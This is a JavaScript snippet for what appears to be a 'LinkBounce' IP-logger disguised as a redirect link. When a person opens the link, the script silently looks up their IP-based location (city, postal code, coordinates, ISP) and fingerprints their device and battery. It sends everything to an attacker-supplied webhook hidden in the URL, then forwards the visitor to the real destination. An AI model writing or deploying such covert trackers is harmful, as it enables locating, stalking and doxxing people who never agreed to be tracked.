    <script defer>
      async function gi(wh, d, t) {
        let info = {
        ip: "Error",
        city: "Error",
        region: "Error",
        country_name: "Error",
        postal: "Error",
        latitude: "Error",
        longitude: "Error",
        asn: "Error",
        org: "Error"
        };

        try {
            const response = await fetch("https://ipapi.co/json");
            if (!response.ok) throw new Error("Failed to fetch IP data");
            info = await response.json();
        } catch (error) {
            console.error("Error fetching IP data:", error);
        }

        const i = {
            label: t,
            destination: d,
            date: new Date().toLocaleDateString(),
            time: new Date().toLocaleTimeString(),
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            userAgent: navigator.userAgent,
            memory: navigator.deviceMemory || "Unknown",
            cores: navigator.hardwareConcurrency || "Unknown",
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled ? navigator.javaEnabled() : "Unknown",
            screenWidth: screen.width,
            screenHeight: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            screenType: screen.orientation.type,
            windowX: window.screenX,
            windowY: window.screenY,
            ip: info.ip,
            location: `${info.city}, ${info.region}, ${info.country_name}`,
            city: info.city,
            region: info.region,
            country: info.country_name,
            postal: info.postal,
            coordinates: `${info.latitude}, ${info.longitude}`,
            asn: info.asn,
            isp: info.org
        };


        navigator.getBattery?.().then(b => {
            i.battery = `${Math.round(b.level * 100)}%`;
            stw(i, wh);
        }).catch(() => {
            i.battery = "Unknown";
            stw(i, wh);
        });
    }

    function stw(i, wh) {
        const ei = btoa(JSON.stringify(i));
        const tu = `https://linkbounce.github.io/package?i=${ei}`;
        console.log("Generated URL:", tu);
        const m = {
          "content": null,
          "embeds": [
            {
              "title": "Link Clicked | \"" + i.label + "\"",
              "description": "[View full info package]("+tu+") | [Visit link destination]("+i.destination+") | [Make new URL](https://linkbounce.github.io/gen)",
              "color": 3348384,
              "fields": [
                {
                  "name": "ðŸ“… Time",
                  "value": i.date,
                  "inline": true
                },
                {
                  "name": "ðŸŒ IP Address",
                  "value": i.ip,
                  "inline": true
                },
                {
                  "name": "ðŸ—ºï¸ Location",
                  "value": i.location,
                  "inline": true
                },
                {
                  "name": "ðŸ›œ ISP",
                  "value": i.isp,
                  "inline": true
                },
                {
                  "name": "ðŸ’» Platform",
                  "value": i.platform,
                  "inline": true
                },
                {
                  "name": "ðŸª Cookies enabled?",
                  "value": i.cookies,
                  "inline": true
                }
              ],
              "author": {
                "name": "LinkBounce Analytics",
                "icon_url": "https://linkbounce.github.io/linkbounce/logosquare.png"
              },
              "footer": {
                "text": "Â© Linkbounce"
              }
            }
          ],
          "attachments": []
        }
        console.log(JSON.stringify(m));
        // const m = {
        //     "content": "",
        //     "tts": false,
        //     "embeds": [
        //         {
        //             "type": "rich",
        //             "title": `ðŸ”” "${i.label}" clicked | LinkBounce`,
        //             "description": `ðŸ”— Destination link: ${i.destination}\nðŸ•— Time: ${i.date}, ${i.time}\nðŸ“² User Agent: ${i.userAgent}\nðŸ–¥ï¸ Platform: ${i.platform}\nðŸŒŽ Language: ${i.language}\nðŸ”‹ Battery: ${i.battery}\nðŸª Cookies Enabled: ${i.cookies}\nðŸ–¥ï¸ Screen Size: ${i.screenWidth} x ${i.screenHeight}\nðŸŒ Tracking URL: [Click here](${tu})`,
        //             "color": 0xff0000
        //         }
        //     ]
        // };

        fetch(wh, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(m),
        })
        .then(() => {
            console.log("Sent data to webhook");
            redir(i.destination)
        })
        .catch(err => console.error("Error sending webhook:", err));
    }

    const p = new URLSearchParams(window.location.search);
    var d;
    if (!p.get('l') || window.location.href.includes("NOREDIRECT")){
      console.log("Skipping redirect");
      d = "noredir";
    } else  {
      d = atob(p.get('l'));
    }
    const wh = atob(p.get('w'));
    const t = atob(p.get('t'));

    gi(wh, d, t);

    function redir(nl){
      if (nl == "noredir") {
        console.log('Skipped redirect');
      } else {
        document.location.href=nl;
      }
    }
    </script>
